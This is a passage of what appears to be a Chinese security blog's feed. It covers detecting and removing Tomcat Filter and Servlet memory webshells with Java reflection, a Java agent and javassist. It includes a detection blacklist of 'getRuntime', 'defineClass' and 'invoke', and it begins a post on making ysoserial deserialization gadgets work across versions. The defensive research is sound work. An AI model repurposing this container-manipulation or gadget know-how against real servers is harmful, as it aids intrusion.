class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deleteFilter</span><span class="params">(HttpServletRequest request,String filterName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Object standardContext = getStandardContext(request);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// org.apache.catalina.core.StandardContext#removeFilterDef</span></span><br><span class="line">    HashMap&lt;String,Object&gt; filterConfig = getFilterConfig(request);</span><br><span class="line">    Object appFilterConfig = filterConfig.get(filterName);</span><br><span class="line">    Field _filterDef = appFilterConfig.getClass().getDeclaredField(<span class="string">"filterDef"</span>);</span><br><span class="line">    _filterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object filterDef = _filterDef.get(appFilterConfig);</span><br><span class="line">    Method removeFilterDef = standardContext.getClass().getDeclaredMethod(<span class="string">"removeFilterDef"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.tomcat.util.descriptor.web.FilterDef.class&#125;);</span><br><span class="line">    removeFilterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    removeFilterDef.invoke(standardContext,filterDef);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// org.apache.catalina.core.StandardContext#removeFilterMap</span></span><br><span class="line">    Object[] filterMaps = getFilterMaps(request);</span><br><span class="line">    <span class="keyword">for</span>(Object filterMap:filterMaps)&#123;</span><br><span class="line">        Field _filterName = filterMap.getClass().getDeclaredField(<span class="string">"filterName"</span>);</span><br><span class="line">        _filterName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String filterName0 = (String)_filterName.get(filterMap);</span><br><span class="line">        <span class="keyword">if</span>(filterName0.equals(filterName))&#123;</span><br><span class="line">            Method removeFilterMap = standardContext.getClass().getDeclaredMethod(<span class="string">"removeFilterMap"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.catalina.deploy.FilterMap.class&#125;);</span><br><span class="line">            removeFilterDef.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            removeFilterMap.invoke(standardContext,filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-注销Servlet内存马"><a href="#0x04-注销Servlet内存马" class="headerlink" title="0x04 注销Servlet内存马"></a>0x04 注销Servlet内存马</h2><p>注销Servlet的原理也是类似，将该Servlet从全局servletMappings和children中清除掉即可。在Tomcat源码中对应的是<code>removeServletMapping</code>和<code>removeChild</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeServletMapping</span><span class="params">(String pattern)</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>.servletMappingsLock) &#123;</span><br><span class="line">        name = (String)<span class="keyword">this</span>.servletMappings.remove(pattern);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Wrapper wrapper = (Wrapper)<span class="keyword">this</span>.findChild(name);</span><br><span class="line">    <span class="keyword">if</span> (wrapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        wrapper.removeMapping(pattern);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.fireContainerEvent(<span class="string">"removeServletMapping"</span>, pattern);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeChild</span><span class="params">(Container child)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(child <span class="keyword">instanceof</span> Wrapper)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(sm.getString(<span class="string">"standardContext.notWrapper"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.removeChild(child);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要反射调用它们即可注销Servlet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">deleteServlet</span><span class="params">(HttpServletRequest request,String servletName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    HashMap&lt;String,Object&gt; childs = getChildren(request);</span><br><span class="line">    Object objChild = childs.get(servletName);</span><br><span class="line">    String urlPattern = <span class="keyword">null</span>;</span><br><span class="line">    HashMap&lt;String,String&gt; servletMaps = getServletMaps(request);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String,String&gt; servletMap:servletMaps.entrySet())&#123;</span><br><span class="line">        <span class="keyword">if</span>(servletMap.getValue().equals(servletName))&#123;</span><br><span class="line">            urlPattern = servletMap.getKey();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(urlPattern != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeServletMapping</span></span><br><span class="line">        Object standardContext = getStandardContext(request);</span><br><span class="line">        Method removeServletMapping = standardContext.getClass().getDeclaredMethod(<span class="string">"removeServletMapping"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;);</span><br><span class="line">        removeServletMapping.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        removeServletMapping.invoke(standardContext, urlPattern);</span><br><span class="line">        <span class="comment">// Tomcat 6必须removeChild 789可以不用</span></span><br><span class="line">        <span class="comment">// 反射调用 org.apache.catalina.core.StandardContext#removeChild</span></span><br><span class="line">        Method removeChild = standardContext.getClass().getDeclaredMethod(<span class="string">"removeChild"</span>, <span class="keyword">new</span> Class[]&#123;org.apache.catalina.Container.class&#125;);</span><br><span class="line">        removeChild.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        removeChild.invoke(standardContext, objChild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-演示"><a href="#0x05-演示" class="headerlink" title="0x05 演示"></a>0x05 演示</h2><p>我们只需要把编写好的<code>tomcat-memshell-scanner.jsp</code>放到可能被注入内存的web项目中，然后通过浏览器访问即可。假设扫描结果如下：</p><p><img src="/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/tomcat-memshell-scan-result.png" alt="Tomcat内存马扫描结果"></p><p>通过分析扫描出的信息，可知<code>filter-b2b1cad2-44be-4f43-8db0-bd43da5ad368</code>是Filter型内存马，原因如下：</p><ol><li>classLoader是可疑的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</code>,这是反序列化漏洞执行代码用的classLoader。</li><li>class在磁盘中没有对应的class文件，只驻留在内存。</li></ol><p><code>/favicon.ico</code>是Servlet型内存马，判断原因如下。</p><ol><li>classLoader是自定义classLoader,当下比较流行的java webshell基本都是自定义了class loader来实现任意代码执行。</li><li>class在磁盘中没有对应的class文件，只驻留在内存。</li></ol><p>最后我们可以dump出那么对应的class，反编译看代码分析<code>filter-b2b1cad2-44be-4f43-8db0-bd43da5ad368</code>是Filter型cmd内存马，<code>/favicon.ico</code>是Servlet型哥斯拉内存马。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;在内存马横行的当下，蓝队or应急的师傅如何能快速判断哪些Filter/Servlet是内存马，分析内
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>查杀Java web filter型内存马</title>
    <link href="http://gv7.me/articles/2020/kill-java-web-filter-memshell/"/>
    <id>http://gv7.me/articles/2020/kill-java-web-filter-memshell/</id>
    <published>2020-08-12T18:04:49.000Z</published>
    <updated>2021-01-21T03:15:21.471Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>想法早在几个月之前就有了，月初收好友之邀请，夜游鼓浪屿，彼时夜朗星稀，山海一色，偶有微波抚足，不觉间有了点写东西的感觉，晚上回到旅社简单写了下。等回到北京后，不料润色之意全无，就凑合看吧。</p></blockquote><p><img src="/articles/2020/kill-java-web-filter-memshell/gulangyu01.jpeg" alt></p><p><img src="/articles/2020/kill-java-web-filter-memshell/gulangyu02.jpeg" alt></p><h2 id="0x01-内存马简历史"><a href="#0x01-内存马简历史" class="headerlink" title="0x01 内存马简历史"></a>0x01 内存马简历史</h2><p>其实内存马由来已久，早在17年n1nty师傅的<a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw" target="_blank" rel="noopener">《Tomcat源码调试笔记-看不见的shell》</a>中已初见端倪，但一直不温不火。后经过rebeyong师傅使用<a href="https://www.cnblogs.com/rebeyond/p/9686213.html" target="_blank" rel="noopener">agent技术</a>加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的<a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">Spring controller内存马</a>。至此内存马开枝散叶发展出了三大类型：</p><ol><li>servlet-api类<ul><li>filter型</li><li>servlet型</li></ul></li><li>spring类<ul><li>拦截器</li><li>controller型</li></ul></li><li>Java Instrumentation类<ul><li>agent型</li></ul></li></ol><p>内存马这坛深巷佳酒，一时间流行于市井与弄堂之间。上至安全研究员下至普通客户，人尽皆知。正值hw来临之际，不难推测届时必将是内存马横行天下之日。而各大安全厂商却迟迟未见动静。所谓表面风平浪静，实则暗流涌动。或许一场内存马的围剿计划正慢慢展开。作为攻击方向的研究人员，没有对手就制造对手,攻防互换才能提升内存马技术的发展。</p><h2 id="0x02-查杀思路"><a href="#0x02-查杀思路" class="headerlink" title="0x02 查杀思路"></a>0x02 查杀思路</h2><p>我们判断逻辑很朴实，利用Java Agent技术遍历所有已经加载到内存中的class。先判断是否是内存马，是则进入内存查杀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader classLoader, String s, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] bytes) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="comment">// 识别内存马</span></span><br><span class="line">    <span class="keyword">if</span>(isMemshell(aClass,bytes))&#123;</span><br><span class="line">        <span class="comment">// 查杀内存马</span></span><br><span class="line">        <span class="keyword">byte</span>[] newClassByte = killMemshell(aClass,bytes);</span><br><span class="line">        <span class="keyword">return</span> newClassByte;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-内存马的识别"><a href="#0x03-内存马的识别" class="headerlink" title="0x03 内存马的识别"></a>0x03 内存马的识别</h2><p>要识别，我们就需要细思内存马有什么特征。下面列下我思考过的检查点。</p><ol><li>filter名字很特别</li></ol><p>内存马的Filter名一般比较特别，有<code>shell</code>或者随机数等关键字。这个特征稍弱，因为这取决于内存马的构造者的习惯，构造完全可以设置一个看起来很正常的名字。</p><ol start="2"><li>filter优先级是第一位</li></ol><p>为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，这在shiro反序列化中是刚需。但其他场景下就非必须，只能做一个可疑点。</p><ol start="2"><li>对比web.xml中没有filter配置</li></ol><p>内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，这也是个可以的特征。但servlet 3.0引入了<code>@WebFilter</code>标签方便开发这动态注册Filter。这种情况也存在没有在web.xml中显式声明，这个特征可以作为较强的特征。</p><ol start="4"><li>特殊classloader加载</li></ol><p>我们都知道Filter也是class，也是必定有特定的classloader加载。一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：</p><ul><li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</li><li>com.sun.org.apache.bcel.internal.util.ClassLoader</li></ul><p>这个特征是一个特别可疑的点了。当然了，有的内存马还是比较狡猾的，它会注入class到当前线程中，然后实例化注入内存马。这个时候内存马就有可能不是上面两个classloader。</p><ol start="5"><li>对应的classloader路径下没有class文件</li></ol><p>所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">classFileIsExists</span><span class="params">(Class clazz)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(clazz == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String className = clazz.getName();</span><br><span class="line">    String classNamePath = className.replace(<span class="string">"."</span>, <span class="string">"/"</span>) + <span class="string">".class"</span>;</span><br><span class="line">    URL is = clazz.getClassLoader().getResource(classNamePath);</span><br><span class="line">    <span class="keyword">if</span>(is == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>Filter的doFilter方法中有恶意代码</li></ol><p>我们可以把内存中所有的Filter的class dump出来，使用<code>fernflower</code>等反编译工具分析看看，是否存在恶意代码，比如调用了如下可疑的方法：</p><ul><li>java.lang.Runtime.getRuntime</li><li>defineClass</li><li>invoke</li><li>…</li></ul><p>不难分析，内存马的命门在于<code>5</code>和<code>6</code>。简单说就是Filter型内存马首先是一个Filter类，同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦。大致检查的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isMemshell</span><span class="params">(Class targetClass,<span class="keyword">byte</span>[] targetClassByte)</span></span>&#123;</span><br><span class="line">    ClassLoader classLoader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(targetClass.getClassLoader() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        classLoader = targetClass.getClassLoader();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class clsFilter =  <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clsFilter = classLoader.loadClass(<span class="string">"javax.servlet.Filter"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否是filter</span></span><br><span class="line">    <span class="keyword">if</span>(clsFilter != <span class="keyword">null</span> &amp;&amp; clsFilter.isAssignableFrom(targetClass))&#123;</span><br><span class="line">        <span class="comment">// class loader 是不是Templates或bcel</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader.getClass().getName().contains(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader"</span>)</span><br><span class="line">                || classLoader.getClass().getName().contains(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 是否存在ClassLoader的文件目录下存在对应的class文件</span></span><br><span class="line">        <span class="keyword">if</span>(classFileIsExists(targetClass))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// filter是否包含恶意代码。</span></span><br><span class="line">        String[] blacklist = <span class="keyword">new</span> String[]&#123;<span class="string">"getRuntime"</span>,<span class="string">"defineClass"</span>,<span class="string">"invoke"</span>&#125;;</span><br><span class="line">        String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte);</span><br><span class="line">        <span class="keyword">for</span>(String b:blacklist)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsJavaCode.contains(b))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS: 本文讨论查杀的思路，给出的代码只是概念正面的伪装代码。完美的方案是将以上6点作为判断指标，并根据指标的重要性赋予不同权重。满足的条件越多越可能是内存马。</p><h2 id="0x04-内存马的查杀"><a href="#0x04-内存马的查杀" class="headerlink" title="0x04 内存马的查杀"></a>0x04 内存马的查杀</h2><p>内存马识别完成，接下来就是如何查杀了。</p><p>方法一： 清除内存马中的Filter的恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] killMemshell(Class clsMemshell,<span class="keyword">byte</span>[] byteMemshell) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    File file = <span class="keyword">new</span> File(String.format(<span class="string">"/tmp/%s.class"</span>,clsMemshell.getName()));</span><br><span class="line">    <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">        file.delete();</span><br><span class="line">    &#125;</span><br><span class="line">    FileOutputStream fos  = <span class="keyword">new</span> FileOutputStream(file.getAbsoluteFile());</span><br><span class="line">    fos.write(byteMemshell);</span><br><span class="line">    fos.flush();</span><br><span class="line">    fos.close();</span><br><span class="line">    ClassPool cp = ClassPool.getDefault();</span><br><span class="line">    cp.insertClassPath(<span class="string">"/tmp/"</span>);</span><br><span class="line">    CtClass cc = cp.getCtClass(clsMemshell.getName());</span><br><span class="line">    CtMethod m = cc.getDeclaredMethod(<span class="string">"doFilter"</span>);</span><br><span class="line">    m.addLocalVariable(<span class="string">"elapsedTime"</span>, CtClass.longType);</span><br><span class="line">    <span class="comment">// 正确覆盖代码：</span></span><br><span class="line">    <span class="comment">// m.setBody("&#123;$3.doFilter($1,$2);&#125;");</span></span><br><span class="line">    <span class="comment">// 方便演示代码：</span></span><br><span class="line">    m.setBody(<span class="string">"&#123;$2.getWriter().write(\"Your memory horse has been killed by c0ny1\");&#125;"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] byteCode = cc.toBytecode();</span><br><span class="line">    cc.detach();</span><br><span class="line">    <span class="keyword">return</span> byteCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二： 模拟中间件注销Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反序列化执行代码反射获取到StandardContext</span></span><br><span class="line">Object standardContext = ...;</span><br><span class="line">Field _filterConfigs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">_filterConfigs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object filterConfigs = _filterConfigs.get(standardContext);</span><br><span class="line">Map&lt;String, ApplicationFilterConfig&gt; filterConfigMap = (Map&lt;String, ApplicationFilterConfig&gt;)filterConfigs;</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, ApplicationFilterConfig&gt; map : filterConfigMap.entrySet())&#123;</span><br><span class="line">    String filterName = map.getKey();</span><br><span class="line">    ApplicationFilterConfig filterConfig = map.getValue();</span><br><span class="line">    Filter filterObject = filterConfig.getFilter();</span><br><span class="line">    <span class="comment">// 如果是内存马的filter名</span></span><br><span class="line">    <span class="keyword">if</span>(filterName.startsWith(<span class="string">"memshell"</span>))&#123;</span><br><span class="line">        SecurityUtil.remove(filterObject);</span><br><span class="line">        filterConfigMap.remove(filterName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配。为了方便演示我们选第一种。</p><h2 id="0x05-demo展示"><a href="#0x05-demo展示" class="headerlink" title="0x05 demo展示"></a>0x05 demo展示</h2><p>最后给大家展示下，我查杀demo的效果。</p><p><img src="/articles/2020/kill-java-web-filter-memshell/kill-java-filter-memshell-demo.gif" alt="查杀演示"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文我们对Filter型内存马的识别与查杀做了细致的分析，其实Servlet型，拦截器型和Controller型的查杀方法也是万变不离其中，可如法炮制。但这样的思路无法查杀Agent型内存马，Agent型内存马查杀难点在“查”不在“杀”，具体的难点在那，又是如何解决呢？我会在后续的《查杀Java web Agent型内存马》中继续分享我的思考。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw" target="_blank" rel="noopener">Tomcat源码调试笔记-看不见的shell</a></li><li><a href="https://www.cnblogs.com/rebeyond/p/9686213.html" target="_blank" rel="noopener">【原创】利用“进程注入”实现无文件不死webshell</a></li><li><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">基于内存 Webshell 的无文件攻击技术研究</a></li><li><a href="https://xz.aliyun.com/t/7388" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;想法早在几个月之前就有了，月初收好友之邀请，夜游鼓浪屿，彼时夜朗星稀，山海一色，偶有微波抚足，不觉间有了点写东西的感觉，晚上回到旅社简单写了下。等回到北京后，不料润色之意全无，就凑合看吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>使用自定义ClassLoader解决反序列化serialVesionUID不一致问题</title>
    <link href="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"/>
    <id>http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/</id>
    <published>2020-07-08T04:57:57.000Z</published>
    <updated>2020-07-09T18:34:31.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><code>serialVesionUid</code>不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。</p><h2 id="0x02-各方案的优劣"><a href="#0x02-各方案的优劣" class="headerlink" title="0x02 各方案的优劣"></a>0x02 各方案的优劣</h2><p>在解决这个问题之前，我尝试的很多方法，简单说下它们各自能解决的问题和存在的缺陷。</p><p><strong>方案1:修改序列化byte数据</strong></p><p>该方法可解决序列化最终数据的serialVesionUID不一致，但无法解决Object的serialVesionUID不一致</p><p><strong>方案2:反射修改serialVesionUID</strong></p><p>可以解决1的缺陷，但无法解决Gadget依赖的class没有serialVesionUID属性的情况，因为反射只能修改Object的属性，不能添加。</p><p><strong>方案3:修改Class字节码，添加或修改serialVesionUID</strong></p><p>能解决Gadget直接依赖Class的serialVesionUID不一致问题，可弥补方案2的缺陷。但不好解决Gadget间接依赖class存在serialVesionUID不一致的情况。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/add-svuid-by-javassist.png" alt="通过javassist给class添加serialVesionUID"></p><p><strong>方案4:Hook ObjectStreamClass.getSerialVesionUID()</strong></p><p>该方法负责返回所有参与序列化Class的serialVesionUID，Hook它并修改返回值，可解决所有class的serialVesionUID不一致问题。但它无法解决Gadget依赖jar版本之间，class差异较大，属性类型不同的情况。因为serialVesionUID发生改变取决于两个因素：Class的属性和方法。如果属性类型改变了，单单只修改serialVesionUID是不够的。</p><p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/modify-svuid-by-hook-getserialversionuid.png" alt="Hook 